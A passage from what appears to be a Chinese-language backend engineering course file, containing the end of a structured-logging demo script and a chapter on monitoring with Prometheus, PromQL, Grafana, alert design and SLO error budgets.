  logger.context.put('traceId', traceId);
  logger.context.put('requestId', requestId);
  logger.context.put('userId', userId);
  logger.context.put('method', 'POST');
  logger.context.put('path', '/api/orders');

  logger.info('收到下单请求', { sku: 'SKU001', qty: 2 });
  const result = orderService(logger.child({ service: 'order-service' }));
  logger.info('下单完成', { orderId: result.orderId, durationMs: result.duration });
  return traceId;
}

function orderService(logger) {
  logger.info('开始创建订单');
  const start = Date.now();
  // 调用库存校验
  inventoryCheck(logger.child({ service: 'inventory-service' }));
  // 模拟一个可恢复的异常
  logger.warn('优惠券服务超时，跳过优惠券', { couponId: 'C123', retry: 1 });
  const orderId = 'ORD' + crypto.randomBytes(3).toString('hex').toUpperCase();
  logger.info('订单创建成功', { orderId, amount: 199.0 });
  return { orderId, duration: Date.now() - start };
}

function inventoryCheck(logger) {
  logger.info('校验库存', { sku: 'SKU001', stock: 100 });
  logger.debug('库存查询 SQL', { sql: 'SELECT stock FROM sku WHERE id=?' });  // DEBUG 默认不输出
  logger.info('库存充足');
}

// ---------- 8. 演示 ----------
console.log('===== 1. 正常请求链路（INFO 级别，traceId 串联）=====');
const traceId = gatewayEntrance('REQ' + Date.now(), 'user_42');
console.log('生成的 traceId:', traceId);

console.log('\\n===== 2. ERROR 链路演示 =====');
{
  const fileApp = new FileAppender();
  const logger = new Logger('payment-service', { level: 'INFO', appenders: [fileApp] });
  logger.context.put('traceId', 'err-trace-001');
  logger.context.put('orderId', 'ORD999');
  logger.info('开始支付');
  logger.error('支付通道超时', { channel: 'alipay', timeoutMs: 5000, stack: 'PaymentTimeout: ...' });
  logger.fatal('重试 3 次仍失败，订单进入异常队列');
  console.log('文件 appender 共采集 ' + fileApp.size() + ' 条日志');
  console.log('可按 traceId=err-trace-001 在 ES 中检索完整链路');
}

console.log('\\n===== 3. 级别过滤 + DEBUG 采样演示 =====');
{
  const logger = new Logger('debug-demo', {
    level: 'DEBUG',
    sampler: new Sampler(3),  // 每 3 条 DEBUG 只记录 1 条
  });
  logger.context.put('traceId', 'sample-001');
  for (let i = 1; i <= 9; i++) {
    logger.debug('循环处理第 ' + i + ' 项', { idx: i });  // 只有 i=3,6,9 输出
  }
  logger.info('处理完成');
  console.log('说明: DEBUG 已采样，每 3 条记录 1 条，避免日志爆炸');
}

console.log('\\n===== 4. 模拟 ELK 查询（按字段过滤）=====');
{
  const store = [];
  const es = new FileAppender();
  const logger = new Logger('search-demo', { level: 'INFO', appenders: [es] });
  logger.context.put('traceId', 'q1'); logger.warn('缓存未命中'); 
  logger.context.put('traceId', 'q2'); logger.error('DB 连接失败');
  logger.context.put('traceId', 'q1'); logger.info('请求完成');

  // 模拟按 level=ERROR 过滤
  const errors = es.lines.map(l => JSON.parse(l)).filter(r => r.level === 'ERROR');
  console.log('查询 level=ERROR 结果 ' + errors.length + ' 条:');
  errors.forEach(r => console.log('  traceId=' + r.traceId + ' msg=' + r.message));
}

console.log('\\n===== 演示结束 =====');
`,
  },

  // =========================================================
  // 第二章：监控与 Prometheus
  // =========================================================
  {
    id: "backend-monitor",
    group: "分布式与工程化",
    icon: "📊",
    title: "监控与 Prometheus",
    content: `## 监控与 Prometheus

如果说日志是后端系统的"案发现场记录"，那么**监控（Monitoring）** 就是系统的"实时体检报告"。日志告诉你"出事时发生了什么"，监控告诉你"系统现在是否健康、是否即将出事"。一个没有监控的系统，就像蒙眼开车——你以为一切正常，直到撞墙。

本章将从可观测性三大支柱讲起，深入监控指标类型、Google 黄金信号、USE/RED 方法、Prometheus 架构、PromQL 实战、Grafana 仪表盘、告警设计、SLI/SLO/SLA 实践，以及常见监控反模式。

### 一、可观测性三大支柱

**可观测性（Observability）** 是指通过系统外部输出推断系统内部状态的能力。云原生时代，可观测性由三大支柱构成：

#### 1.1 日志（Logs）

- **特点**：离散事件记录，每个事件一条记录，含丰富上下文。
- **用途**：排查具体问题、审计、合规。
- **代价**：高（每事件一条，存储和采集成本高）。
- **代表工具**：ELK、Loki、Splunk。

日志擅长回答"发生了什么"，但无法高效回答"系统整体趋势如何"——你要从几百万条日志里聚合出"过去 1 小时的 QPS"非常昂贵。

#### 1.2 指标（Metrics）

- **特点**：时序数值数据，每个指标是一组带时间戳的数值。
- **用途**：宏观监控、告警、容量规划、趋势分析。
- **代价**：低（聚合后的数值，数据量小）。
- **代表工具**：Prometheus、InfluxDB、Datadog。

指标擅长回答"系统整体如何"，如"当前 QPS 多少""错误率多少""P99 延迟多少"。它是监控的主力。

#### 1.3 链路追踪（Tracing）

- **特点**：一次请求经过多个服务的完整调用链。
- **用途**：跨服务故障定位、性能瓶颈分析、依赖关系梳理。
- **代价**：中（需要采样控制开销）。
- **代表工具**：Jaeger、Zipkin、SkyWalking。

追踪擅长回答"这个慢请求慢在哪一跳""这次失败经过了哪些服务"。

#### 1.4 三者关系

三者互补而非替代：
- **Metrics 告警** → 发现"错误率升高"。
- **Tracing 定位** → 找到"是哪个服务哪一跳慢"。
- **Logs 查细节** → 看到"那个慢请求的具体参数和堆栈"。

这是经典的排查路径：监控发现问题 → 追踪定位范围 → 日志查根因。三者要关联——通过 traceId 串联，通过标签（service、env）对齐。

---

### 二、为什么需要监控

#### 2.1 发现故障

系统故障不可避免，关键是"先于用户发现"。监控能在故障发生时（甚至发生前）发出告警，让工程师在用户投诉前介入。理想目标是 MTTR（平均修复时间）最小化。

#### 2.2 定位问题

监控数据帮助快速定位问题范围：是哪个服务？哪个接口？哪个机房？什么时间开始的？是否与发布相关？好的监控仪表盘能让工程师 30 秒内判断"哪里出了问题"。

#### 2.3 容量规划

监控历史数据反映资源使用趋势：CPU、内存、磁盘、带宽的增长曲线。据此可以预测"按当前增长速度，3 个月后磁盘会满""下个月需要扩容 5 台机器"。容量规划避免"突然满了"的被动局面。

#### 2.4 SLA 保障

SLA（服务等级协议）承诺可用性（如 99.9%），需要监控来度量和证明。监控记录正常时间和故障时间，计算可用性，生成 SLA 报告。没有监控，SLA 就是无从验证的空话。

#### 2.5 业务分析

监控不止监控技术指标，还监控业务指标：订单量、支付成功率、活跃用户数、GMV。这些业务指标实时反映业务健康，大促时是决策依据。

---

### 三、监控指标类型详解

Prometheus 定义了四种核心指标类型，理解它们的区别是设计监控的基础。

#### 3.1 Counter（计数器）

**特点**：单调递增，只能增加不能减少（除非重启归零）。

**适用场景**：累计的请求数、错误数、处理字节数。

\`\`\`
http_requests_total{method="GET", status="200"} 12345
http_requests_total{method="GET", status="500"} 3
http_errors_total{type="timeout"} 12
\`\`\`

Counter 本身只反映"累计值"，要看"速率"要用 \`rate()\` 函数：\`rate(http_requests_total[1m])\` 表示每秒的请求速率（QPS）。

**多语言对照**：

\`\`\`java
// Micrometer (Java)
Counter counter = Counter.builder("http.requests").tag("status", "200").register(registry);
counter.increment();
\`\`\`

\`\`\`go
// Prometheus Go client
httpRequests := prometheus.NewCounterVec(
    prometheus.CounterOpts{Name: "http_requests_total"},
    []string{"status"},
)
httpRequests.WithLabelValues("200").Inc()
\`\`\`

\`\`\`python
# prometheus_client (Python)
from prometheus_client import Counter
http_requests = Counter('http_requests_total', 'Total requests', ['status'])
http_requests.labels(status='200').inc()
\`\`\`

**注意**：Counter 的值"看起来"很大（如 123456789），没有直接意义。重要的是它的"变化速率"。

#### 3.2 Gauge（瞬时值）

**特点**：可增可减，反映当前瞬时状态。

**适用场景**：当前连接数、队列长度、内存使用量、CPU 使用率、温度。

\`\`\`
active_connections 42
queue_length 5
memory_usage_bytes 8589934592
cpu_usage_percent 75.5
\`\`\`

Gauge 的值直接有意义——"当前 42 个连接"就是 42。可以对 Gauge 做 \`avg_over_time\`、\`max_over_time\` 等时间聚合。

\`\`\`javascript
// Node.js 风格伪代码
gauge.set(42);       // 设置当前值
gauge.inc();         // +1
gauge.dec(3);        // -3
\`\`\`

#### 3.3 Histogram（直方图）

**特点**：把观测值分到预定义的桶（bucket）中，统计每个桶的累计计数。

**适用场景**：请求延迟分布、响应体大小分布。

\`\`\`
http_request_duration_seconds_bucket{le="0.1"} 1000   // <=0.1s 的请求 1000 个
http_request_duration_seconds_bucket{le="0.5"} 1200   // <=0.5s 的 1200 个
http_request_duration_seconds_bucket{le="1.0"} 1250
http_request_duration_seconds_bucket{le="+Inf"} 1300  // 所有 1300 个
http_request_duration_seconds_sum 215.5               // 总耗时 215.5s
http_request_duration_seconds_count 1300              // 总次数 1300
\`\`\`

桶（le = less than or equal）是累积的：le=0.5 的计数包含 le=0.1 的。这种累积设计便于用 \`histogram_quantile\` 计算分位数。

**桶的设计很关键**：桶太少则分位数不准，桶太多则指标膨胀。常见延迟桶：0.001, 0.005, 0.01, 0.05, 0.1, 0.5, 1, 5, 10, +Inf。要根据实际延迟范围选择。

Histogram 的优势：分桶在客户端完成，聚合时可以跨实例合并（不同实例的桶可相加再算分位数），适合分布式系统。

#### 3.4 Summary（摘要）

**特点**：在客户端直接计算分位数（quantile），如 P50、P90、P99。

\`\`\`
http_request_duration_seconds{quantile="0.5"} 0.042
http_request_duration_seconds{quantile="0.9"} 0.156
http_request_duration_seconds{quantile="0.99"} 0.523
\`\`\`

Summary 的优势：直接给出分位数，查询简单。劣势：**分位数无法跨实例聚合**——你不能把实例 A 的 P99 和实例 B 的 P99 平均得到整体的 P99（数学上不对）。所以多实例场景下，Summary 不可用，必须用 Histogram。

| 特性 | Histogram | Summary |
|------|-----------|---------|
| 客户端开销 | 低（分桶） | 高（流式分位数计算） |
| 跨实例聚合 | 支持 | 不支持 |
| 分位数精度 | 依赖桶设计 | 较高 |
| 动态分位数 | 支持（查询时指定） | 不支持（客户端预设） |
| 推荐场景 | 分布式系统、多实例 | 单实例 |

**结论**：生产环境（多实例）几乎都用 Histogram，不用 Summary。

---

### 四、Google 四个黄金信号

Google SRE 书籍提出的"四个黄金信号"是服务监控的核心框架，任何服务都应监控这四项：

#### 4.1 延迟（Latency）

请求处理耗时。要区分成功请求和错误请求的延迟——错误请求可能很快返回（如校验失败立即 400），把它和正常请求混合会拉低平均延迟，造成"延迟很低"的假象。

监控延迟要用分位数（P50/P90/P99），不要用平均值。平均值的"长尾效应"会掩盖慢请求：100 个请求 1ms + 1 个请求 1s，平均 ~11ms 看起来正常，但那 1 个 1s 的请求对用户体验是灾难。

#### 4.2 流量（Traffic）

服务承受的请求量。QPS（每秒请求数）是 HTTP 服务的流量指标；消息队列用消息速率；数据库用事务速率。流量反映系统负载，是容量规划的依据。

#### 4.3 错误（Errors）

错误率。包括：
- **显式错误**：HTTP 5xx、RPC 错误码。
- **隐式错误**：HTTP 4xx（客户端错误，但部分场景算服务问题）、错误响应内容（如返回 200 但 body 里 status=error）。
- **业务错误**：如支付失败率（不算系统错误但影响业务）。

错误率要按接口、按错误类型细分，便于定位。

#### 4.4 饱和度（Saturation）

资源利用程度。CPU、内存、磁盘、连接池、线程池的使用率。饱和度反映"系统离极限还有多远"——当 CPU 80% 时，离过载不远了。要监控"受限资源"的饱和度，知道系统的瓶颈在哪。

四个黄金信号是"服务健康"的最小集合，缺一不可。

---

### 五、USE 方法

Brendan Gregg 提出的 **USE 方法**（Utilization、Saturation、Errors）适用于**资源监控**（CPU、磁盘、网络等硬件/系统资源）：

- **Utilization（利用率）**：资源用于工作的平均时间比例。如 CPU 利用率 60%。
- **Saturation（饱和度）**：资源排队程度，资源饱和后工作开始排队。如 CPU 运行队列长度、磁盘 IO 等待。
- **Errors（错误）**：资源错误事件。如网卡丢包、磁盘 IO 错误。

USE 方法对每个资源问三个问题：利用率多高？是否饱和？有错误吗？

| 资源 | Utilization | Saturation | Errors |
|------|-------------|------------|--------|
| CPU | CPU% | run queue length | - |
| 内存 | 已用/总量 | swap I/O | OOM kill |
| 磁盘 | IO% | IO wait | IO errors |
| 网络 | 带宽% | 丢包/重传 | rx/tx errors |

USE 关注"资源"，对应系统层面；RED 关注"服务"，对应应用层面。两者互补。

---

### 六、RED 方法

**RED 方法**（Rate、Errors、Duration）适用于**服务监控**，尤其是请求驱动型服务：

- **Rate（速率）**：每秒请求数（QPS）。
- **Errors（错误）**：每秒错误数或错误率。
- **Duration（延迟）**：请求处理延迟分布（P50/P90/P99）。

RED 是四个黄金信号的子集（去掉饱和度），更聚焦。每个微服务、每个接口都应有 RED 指标。Grafana 仪表盘通常以 RED 为基础布局。

RED + USE = 覆盖服务和资源两个层面，构成较完整的监控视图。

---

### 七、Prometheus 架构详解

Prometheus 是 CNCF 第二大项目（仅次于 Kubernetes），是云原生监控的事实标准。

#### 7.1 整体架构

\`\`\`
应用(Exporter/SDK) ← Pull ← Prometheus Server → TSDB
                                          ↓
                                      AlertManager → 告警通知
                                          ↓
                                      Grafana → 仪表盘
\`\`\`

核心组件：
- **Prometheus Server**：核心，负责拉取（Pull）指标、存储（TSDB）、执行查询（PromQL）。
- **Exporter**：被监控端暴露指标的端点，Prometheus 拉取。如 node_exporter（机器指标）、mysql_exporter（MySQL 指标）、应用内置的 /metrics。
- **Alertmanager**：接收 Prometheus 告警，去重、分组、路由、发送通知。
- **Grafana**：可视化，查询 Prometheus 数据画图。
- **Pushgateway**：用于短任务（短生命周期进程无法被 Pull），任务把指标推到 Pushgateway，Prometheus 再从 Pushgateway 拉。

#### 7.2 Pull 拉取模型

Prometheus 主动拉取（scrape）目标端的 /metrics 接口，而非被动接收。这与 StatsD（Push）不同。

Pull 的优势：
- **主动控制**：Prometheus 知道有哪些目标，拉取失败能立即发现（目标 down）。
- **安全**：被监控端不需要主动连接监控系统，减少攻击面。
- **调试方便**：/metrics 是 HTTP 端点，curl 就能看。

Pull 的劣势：
- **短任务不友好**：短生命周期进程可能还没被拉就退出了（用 Pushgateway 解决）。
- **NAT/防火墙后端无法拉**：用 Pushgateway 或 Federation 解决。

#### 7.3 Service Discovery（服务发现）

Prometheus 不硬编码目标列表，而是通过服务发现动态获取监控目标：
- Kubernetes SD：从 K8s API 发现 Pod/Service。
- Consul SD：从 Consul 发现服务。
- EC2/Azure SD：从云厂商发现实例。
- DNS/文件 SD：基于 DNS 或配置文件。

服务发现让监控随集群规模自动伸缩，无需手动维护目标列表。

#### 7.4 TSDB（时序数据库）

Prometheus 内置 TSDB，存储时序数据：
- **数据模型**：指标名 + 标签集合 = 一条时间序列（series）。每个 series 存一系列 (timestamp, value)。
- **存储**：本地磁盘，按 2 小时一个 block 存储，压缩率高。
- **保留期**：默认 15 天（通过 --storage.tsdb.retention.time 配置）。长期存储需要远程存储（如 Thanos、VictoriaMetrics）。

数据模型示例：
\`\`\`
http_requests_total{method="GET", status="200", instance="10.0.0.1:8080"}  12345 @1700000000
http_requests_total{method="GET", status="200", instance="10.0.0.1:8080"}  12350 @1700000015
\`\`\`

同一个指标名，不同标签组合是不同的 series。标签组合爆炸（高基数）是 TSDB 的杀手——如把 userId 作为标签，几百万用户就是几百万 series，会撑爆内存。**不要把高基数字段（userId、orderId、URL）作为标签**。

#### 7.5 指标暴露格式

应用通过 /metrics 端点暴露 Prometheus 文本格式指标：

\`\`\`
# HELP http_requests_total Total HTTP requests
# TYPE http_requests_total counter
http_requests_total{method="GET",status="200"} 12345
http_requests_total{method="GET",status="500"} 3

# HELP http_request_duration_seconds Request duration
# TYPE http_request_duration_seconds histogram
http_request_duration_seconds_bucket{le="0.1"} 1000
http_request_duration_seconds_bucket{le="0.5"} 1200
http_request_duration_seconds_bucket{le="+Inf"} 1300
http_request_duration_seconds_sum 215.5
http_request_duration_seconds_count 1300

# HELP active_connections Current active connections
# TYPE active_connections gauge
active_connections 42
\`\`\`

每行：指标名{标签=值} 数值。# HELP 是说明，# TYPE 是类型声明。

---

### 八、PromQL 实战

PromQL 是 Prometheus 的查询语言，功能强大。

#### 8.1 即时查询（Instant Vector）

\`\`\`
http_requests_total  # 当前值
http_requests_total{status="500"}  # 带 label 过滤
http_requests_total{status=~"5.."}  # 正则匹配 5xx
\`\`\`

返回每个 series 的最新值。

#### 8.2 rate 与 increase

\`\`\`
rate(http_requests_total[1m])  # 每秒速率（QPS），推荐
increase(http_requests_total[1m])  # 1 分钟内增量（总数）
\`\`\`

rate 处理 Counter 重置（进程重启归零）：如果值变小，rate 会假设发生了重置并正确计算。所以查 QPS 必须用 rate，不能直接相减。

rate 的窗口 [1m] 表示"过去 1 分钟"，窗口太短会抖动，太长会迟钝。常用 1m、5m。

#### 8.3 histogram_quantile（分位数）

\`\`\`
# 计算 P99 延迟
histogram_quantile(0.99, rate(http_request_duration_seconds_bucket[5m]))
\`\`\`

这是最常用也最易错的查询。注意：rate 要在 bucket 上算，histogram_quantile 包在外面。多实例场景还要先 sum：

\`\`\`
histogram_quantile(0.99, sum by (le) (rate(http_request_duration_seconds_bucket[5m])))
\`\`\`

#### 8.4 聚合运算

\`\`\`
sum(http_requests_total)  # 求和
sum by (status) (http_requests_total)  # 按 status 分组求和
avg by (instance) (cpu_usage)  # 按实例平均
topk(3, http_requests_total)  # 取前 3
\`\`\`

#### 8.5 时间聚合

\`\`\`
avg_over_time(cpu_usage[1h])  # 过去 1 小时平均
max_over_time(queue_length[5m])  # 过去 5 分钟最大
\`\`\`

#### 8.6 运算与比率

\`\`\`
# 错误率 = 错误 / 总数
sum(rate(http_requests_total{status=~"5.."}[5m]))
  / sum(rate(http_requests_total[5m]))

# 可用性 = 1 - 错误率
1 -
  (sum(rate(http_requests_total{status=~"5.."}[5m]))
   / sum(rate(http_requests_total[5m])))
\`\`\`

#### 8.7 常用查询示例

\`\`\`
# 1. 总 QPS
sum(rate(http_requests_total[1m]))

# 2. 按接口 QPS
sum by (path) (rate(http_requests_total[1m]))

# 3. P99 延迟（所有实例聚合）
histogram_quantile(0.99, sum by (le, path) (rate(http_request_duration_seconds_bucket[5m])))

# 4. 错误率
sum(rate(http_requests_total{status=~"5.."}[5m])) / sum(rate(http_requests_total[5m]))

# 5. CPU 使用率（node_exporter）
100 - (avg by (instance) (rate(node_cpu_seconds_total{mode="idle"}[5m])) * 100)

# 6. 内存使用率
1 - (node_memory_MemAvailable_bytes / node_memory_MemTotal_bytes)
\`\`\`

---

### 九、Grafana 仪表盘设计

Grafana 是最流行的可视化工具，查询 Prometheus 数据画图。

#### 9.1 仪表盘布局原则

一个服务仪表盘通常包含：
1. **概览行**：QPS、错误率、P99 延迟、可用性（黄金信号一眼可见）。
2. **流量行**：按接口的 QPS、状态码分布。
3. **延迟行**：P50/P90/P99 趋势、延迟分布热力图。
4. **错误行**：错误率、错误数、错误类型 TopN。
5. **资源行**：CPU、内存、连接池、GC。
6. **业务行**：订单量、支付成功率等业务指标。

每个面板（panel）聚焦一个主题，避免堆砌。仪表盘要"30 秒能看懂系统状态"。

#### 9.2 阈值与告警线

在图上画阈值线和告警线，让"正常范围"可视化。如 P99 延迟图上画 500ms 红线，超过即异常。

#### 9.3 变量与模板

用变量（如 \`\$service\`、\`\$instance\`）做下拉选择，一个仪表盘复用于多个服务/实例。Prometheus 标签自动填充变量选项。

---

### 十、告警设计原则

告警是监控的"出口"——监控发现问题后通过告警通知人。告警设计不好，要么漏报（问题发生了不告警），要么噪声（告警满天飞，没人看）。

#### 10.1 基于症状告警

告警应基于"用户感知的症状"（如错误率高、延迟高），而非"原因"（如 CPU 高、磁盘满）。CPU 高不一定是问题（可能正在做批处理），但错误率高一定是问题。

症状告警关注"用户体验是否受影响"，直接、可执行。原因告警容易误报。

#### 10.2 分级 P0-P3

- **P0**：核心功能不可用，需立即响应（如支付全挂）。电话+短信叫醒 on-call。
- **P1**：部分功能受影响，需 15 分钟内响应。短信+IM。
- **P2**：潜在风险，工作时间处理。IM。
- **P3**： informational，记录即可。

分级让 on-call 知道"该多急"。所有告警都 P0 会导致疲劳，最后都忽略。

#### 10.3 避免告警疲劳

- **合理阈值**：阈值不是拍脑袋，要基于历史数据（如 P99 长期 200ms，设 500ms 告警）。
- **持续时间**：瞬时报错不告警，持续 N 分钟才告警（避免抖动）。
- **去重与抑制**：同一问题短时间内只告警一次；上游告警抑制下游告警（数据库挂了导致所有服务报错，只告数据库）。
- **可执行性**：每条告警都应有明确的处置动作。如果收到告警不知道该怎么办，这条告警就是垃圾。

#### 10.4 告警规则示例

\`\`\`yaml
# 高错误率告警
- alert: HighErrorRate
  expr: |
    sum(rate(http_requests_total{status=~"5.."}[5m]))
      / sum(rate(http_requests_total[5m])) > 0.05
  for: 5m  # 持续 5 分钟
  labels:
    severity: P1
  annotations:
    summary: "{{ $labels.service }} 错误率 > 5%"
    description: "当前错误率 {{ $value | humanizePercentage }}，请检查"

# 服务不可用告警
- alert: ServiceDown
  expr: up{job="order-service"} == 0
  for: 1m
  labels:
    severity: P0
  annotations:
    summary: "order-service 实例 {{ $labels.instance }} 不可用"
\`\`\`

\`for: 5m\` 表示条件持续 5 分钟才触发，避免短暂抖动告警。

---

### 十一、容量规划与饱和度监控

容量规划回答"系统还能撑多久，什么时候该扩容"。

#### 11.1 饱和度指标

- CPU 使用率 > 80% 持续：需扩容或优化。
- 内存使用率 > 85%：接近 OOM。
- 磁盘使用率 > 75%：需清理或扩容。
- 连接池使用率 > 80%：连接池不够。
- 队列堆积：消费者跟不上生产者。

#### 11.2 趋势预测

基于历史数据预测资源耗尽时间。如磁盘每天增长 10GB，剩余 200GB，预计 20 天后满。提前规划，避免"突然满了"。

Prometheus 的 \`predict_linear\` 函数可做线性预测：
\`\`\`
predict_linear(node_filesystem_avail_bytes[1h], 24 * 3600) < 0
# 预测 24 小时后磁盘是否用完
\`\`\`

---

### 十二、SLI/SLO/SLA 实践

Google SRE 的核心理念：用"错误预算"平衡稳定性和迭代速度。

#### 12.1 定义

- **SLI（Service Level Indicator）**：服务等级指标，可度量的信号。如"成功请求数/总请求数"。
- **SLO（Service Level Objective）**：服务等级目标，SLI 的目标值。如"99.9% 的请求成功"。
- **SLA（Service Level Agreement）**：服务等级协议，对外承诺，违反有赔偿。如"99.9% 可用，否则退款 10%"。

SLI 是测量，SLO 是内部目标，SLA 是对外承诺。SLO 通常比 SLA 严格（留余量）。

#### 12.2 错误预算（Error Budget）

SLO 99.9% 意味着允许 0.1% 的"错误"——这就是错误预算。

一个月（43200 分钟）的 0.1% = 43.2 分钟。这 43 分钟是可以"消耗"的：
- 用一部分上线新功能（可能有 bug 导致小故障）。
- 用一部分做混沌实验。
- 预算耗尽，停止发新功能，专注稳定。

错误预算把"稳定性"和"迭代速度"量化为同一个度量，避免两者对立。

#### 12.3 基于错误预算的告警

- **预算消耗过快**：2 小时消耗了 30 天预算的 2%（按速率告警，需立即处理）。
- **预算即将耗尽**：消耗 80%（需停止风险操作）。
- **预算耗尽**：SLO 违反（强制停止发版）。

这种告警比"错误率 > X%"更科学——它关注"是否在透支预算"，而非瞬时波动。

---

### 十三、常见监控反模式

#### 13.1 监控过多无重点

把所有能采的指标都采，仪表盘堆了几十个面板，反而看不出重点。监控要聚焦黄金信号和关键业务指标，"少而准"胜过"多而乱"。

#### 13.2 告警阈值不合理

- 阈值太低：正常波动也告警，疲劳。
- 阈值太高：出了大问题才告警，太晚。
- 静态阈值不适配增长：业务量翻倍后原阈值失效。

阈值要基于历史数据动态调整，结合持续时间。

#### 13.3 无分级

所有告警同等优先级，on-call 不知道哪个急。必须分级 P0-P3。

#### 13.4 监控指标用错类型

- 把可增可减的值用 Counter：Counter 只增，用 Gauge。
- 把延迟用 Counter 计数而非 Histogram：无法算分位数。
- 把高基数字段当标签：撑爆 TSDB。

#### 13.5 只监控不告警

采集了指标但没配告警，出问题没人知道。监控的最终目的是"出事时通知人"，告警规则必须配齐。

#### 13.6 只看技术指标不看业务

只监控 CPU、内存，不监控订单量、支付成功率。技术正常但业务异常（如支付通道挂了）发现不了。

#### 13.7 监控系统自身不被监控

Prometheus 挂了没人知道。要监控 Prometheus 自身（如 prometheus_target_scrape_pool_targets）、Alertmanager 可达性。

---

### 十四、监控分层

完整的监控覆盖三层：

1. **基础设施层**：CPU、内存、磁盘、网络。用 node_exporter。
2. **中间件层**：MySQL、Redis、Kafka、Nginx 的指标。用对应 exporter。
3. **应用层**：业务接口的 QPS、延迟、错误率、业务指标。应用内置 /metrics。

三层都要监控，缺一层就有盲区。

---

### 十五、本章小结

监控是系统健康的"实时仪表盘"。核心要点：

1. **三大支柱**：Metrics（宏观）+ Logs（细节）+ Tracing（链路）互补。
2. **四种指标类型**：Counter（计数）、Gauge（瞬时值）、Histogram（分布）、Summary（分位数，慎用）。
3. **四个黄金信号**：延迟、流量、错误、饱和度。
4. **USE 看资源，RED 看服务**。
5. **Prometheus**：Pull 模型 + TSDB + PromQL + Service Discovery。
6. **PromQL 核心函数**：rate、increase、histogram_quantile、sum by、avg_over_time。
7. **告警**：基于症状、分级、避免疲劳、可执行。
8. **SLI/SLO/SLA + 错误预算**：量化稳定性，平衡迭代。

下一章我们学习分布式链路追踪，看看如何追踪一次请求在微服务间的完整调用链。

**面试高频问题**：

- 可观测性三大支柱？各自职责？
- Counter 和 Gauge 区别？rate() 用在哪个？
- Histogram 和 Summary 区别？为什么生产用 Histogram？
- 四个黄金信号是什么？
- USE 方法和 RED 方法分别用于什么？
- Prometheus 为什么用 Pull 不用 Push？
- Prometheus 标签为什么不能高基数？
- histogram_quantile 怎么算 P99？
- SLO 和 SLA 区别？错误预算是什么？
- 告警设计原则？怎么避免告警疲劳？

**延伸阅读**：

- Prometheus 官方文档：https://prometheus.io/docs/
- 《Site Reliability Engineering》—— Google SRE 团队
- 《Observability Engineering》—— Charity Majors 等
- Brendan Gregg USE 方法：https://brendangregg.com/usemethod.html

---

## 附录 A：Prometheus 架构深度剖析

Prometheus 是 CNCF 第二个毕业项目（仅次于 Kubernetes），是云原生监控的事实标准。理解其架构有助于更好地使用和调优。

### A.1 核心组件

1. Prometheus Server：核心服务，负责采集（scrape）、存储（TSDB）、查询（PromQL）。
2. Alertmanager：告警管理，去重、分组、路由、静默、发送通知。
3. Pushgateway：推送网关，用于短命任务（Cron Job）推送指标。
4. Exporters：各类 exporter 把现有系统指标暴露为 Prometheus 格式。
5. Service Discovery：服务发现，动态发现采集目标。

### A.2 采集流程（Pull 模型）

Prometheus 主动拉取（scrape）目标的 /metrics 端点：

1. Service Discovery 发现目标（如 K8s Pod 列表）。
2. 按 scrape_interval（默认 15 秒）定期拉取每个目标的 /metrics。
3. 目标返回文本格式的指标（如 http_requests_total{method="GET"} 1234）。
4. Prometheus 解析后存入 TSDB。
5. 如果拉取失败（超时、连接拒绝），记录 up=0，可触发告警。

为什么用 Pull 不用 Push？

- 主动控制采集频率，防止应用疯狂推送打爆监控。
- 应用不需要知道监控 server 地址，解耦。
- 拉取失败本身就是信号（up=0），Push 模式不知道应用是否挂了。
- 简单的 HTTP 拉取，不需要额外 SDK。

### A.3 TSDB 存储原理

Prometheus 的时序数据库（TSDB）专为监控数据优化：

1. **时序数据模型**：每个时间序列由 metric name + label set 唯一标识。如 http_requests_total{method="GET",status="200"} 是一个时间序列。
2. **存储格式**：按时间分块（Block），每 2 小时一个 Block。Block 内用 Gorilla 压缩算法（XOR 编码），压缩率高、查询快。
3. **降采样**：长期数据自动降采样。如 15 秒粒度保留 15 天，5 分钟粒度保留 6 个月。
4. **本地存储**：默认本地存储（不依赖外部 DB），简单但有上限。
5. **远程存储**：通过 remote_write 把数据同步到 Thanos/Cortex/M3DB 等长期存储。

### A.4 标签与高基数问题

Prometheus 的标签是强大的维度，但也有陷阱：

**正确用法**：

    http_requests_total{method="GET",status="200",handler="/api/orders"}

method、status、handler 都是有限枚举值，组合数可控。

**高基数错误**：

    http_requests_total{user_id="12345",session_id="abc678",request_id="req999"}

user_id、session_id、request_id 是高基数标签——每个值产生一个独立时间序列。1 万用户就产生 1 万时间序列，TSDB 会爆炸。

原则：标签值必须是有限枚举（如 method、status、error_code），不能用用户 ID、会话 ID、请求 ID 等无限值。

如果一个时间序列的 cardinality（基数）超过 10 万，就是高基数问题。用 prometheus_tsdb_head_series 指标监控时间序列总数。

### A.5 Service Discovery 机制

静态配置目标不灵活（加机器要改配置）。Service Discovery 动态发现目标：

**Kubernetes SD**：

    scrape_configs:
      - job_name: k8s-pods
        kubernetes_sd_configs:
          - role: pod
        relabel_configs:
          - source_labels: [__meta_kubernetes_pod_annotation_prometheus_io_scrape]
            action: keep
            regex: true

自动发现所有带 prometheus.io/scrape=true 注解的 Pod，采集其 /metrics。

**Consul SD**：

    scrape_configs:
      - job_name: consul-services
        consul_sd_configs:
          - server: consul:8500
        relabel_configs:
          - source_labels: [__meta_consul_service]
            target_label: service

从 Consul 注册中心发现服务。

**EC2/AWS SD**：自动发现 AWS EC2 实例。

Service Discovery 让监控"自维护"——服务扩缩容时自动调整采集目标。

---

## 附录 B：PromQL 进阶

### B.1 即时向量 vs 区间向量

- 即时向量（Instant Vector）：某一时刻的值，如 http_requests_total。
- 区间向量（Range Vector）：一段时间内的值，如 http_requests_total[5m]。
- 标量（Scalar）：单个数值，如 42。

### B.2 rate vs increase

    rate(http_requests_total[5m])      # 每秒增长率
    increase(http_requests_total[5m])  # 5分钟内总增量

rate 是 increase 除以时间。increase 适合"5 分钟内有多少请求"，rate 适合"每秒多少请求"。

### B.3 histogram_quantile 详解

计算 P99 延迟：

    histogram_quantile(0.99, sum(rate(http_duration_seconds_bucket[5m])) by (le))

工作原理：
1. rate() 算出每个 bucket 的每秒增长率。
2. sum by (le) 按桶聚合（跨实例）。
3. histogram_quantile 在桶间插值，算出 99 分位数。

注意：桶（le 标签）必须覆盖目标分位数。如果最大桶 le="+Inf"，P99 能算；如果最大桶 le="0.1"，P99 无法超过 0.1 秒。

### B.4 常用 PromQL 模式

**QPS（每秒请求数）**：

    sum(rate(http_requests_total[5m]))

**错误率**：

    sum(rate(http_requests_total{status=~"5.."}[5m])) 
    / 
    sum(rate(http_requests_total[5m]))

**P99 延迟**：

